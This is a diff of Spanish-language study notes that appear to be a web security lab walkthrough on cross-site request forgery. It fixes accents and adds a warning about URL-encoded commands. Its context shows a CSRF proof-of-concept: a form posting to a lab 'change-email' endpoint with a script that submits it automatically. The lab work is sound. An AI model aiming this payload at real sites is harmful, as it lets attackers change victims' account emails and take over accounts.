@@ -59,7 +59,7 @@ email=pwned@evil-user.net
 
 ![[Pasted image 20250703153921.png]]
 
-ahora reconstruimos la solicitud y deberia quedarnos algo asi:
+ahora reconstruimos la solicitud y debería quedarnos algo así:
 
 ```python
 <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
@@ -69,3 +69,6 @@ ahora reconstruimos la solicitud y deberia quedarnos algo asi:
 	document.forms[0].submit(); 
 </script>
 ```
+
+en esta caso debemos tener precausión con los comandos que estan urlencodeados 
+![[Pasted image 20250703154708.png]]
